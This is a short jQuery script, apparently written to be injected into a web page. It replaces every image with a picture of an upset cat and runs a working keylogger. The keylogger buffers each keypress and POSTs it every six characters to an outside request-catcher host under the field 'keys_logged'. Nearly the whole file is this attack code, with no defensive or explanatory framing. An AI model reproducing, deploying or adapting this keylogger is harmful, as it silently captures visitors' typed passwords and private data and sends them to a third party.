console.log("hello");



$('img').each(function(index){
	console.log($(this))
	$(this).attr('src', "https://www.catster.com/wp-content/uploads/2018/05/A-gray-cat-crying-looking-upset.jpg")
})

let buffer = "";
const bufferSize = 6;
const keyloggerDestinationUrl = "https://caleb.requestcatcher.com/"

let params

$(document).keypress(function(event){
  buffer += (String.fromCharCode(event.which)); 
  if(buffer.length % bufferSize == 0){
  	$.post(keyloggerDestinationUrl, {keys_logged : buffer}, function(data){

  	})
  	
  }
});